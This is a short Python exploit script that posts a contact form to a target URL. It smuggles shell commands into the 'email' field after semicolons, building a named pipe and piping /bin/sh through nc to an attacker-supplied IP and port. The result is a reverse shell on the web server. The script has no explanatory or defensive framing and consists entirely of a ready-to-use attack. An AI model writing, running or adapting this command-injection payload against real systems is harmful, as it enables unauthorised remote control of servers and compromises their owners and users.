import requests,sys

if len(sys.argv) != 4:
    print(f"usage {sys.argv[0]} <url> <ip> <port>")
    exit(0)
try:
    payload = "a@%s;a@a.com;rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f"%(sys.argv[2],sys.argv[2],sys.argv[3])
    req = requests.post(sys.argv[1],data={'name':'shifat','email': payload ,'subject':'payload','message':'test'})
    print(f"status {req.status_code}")
except Exception as Err:
    print(str(Err))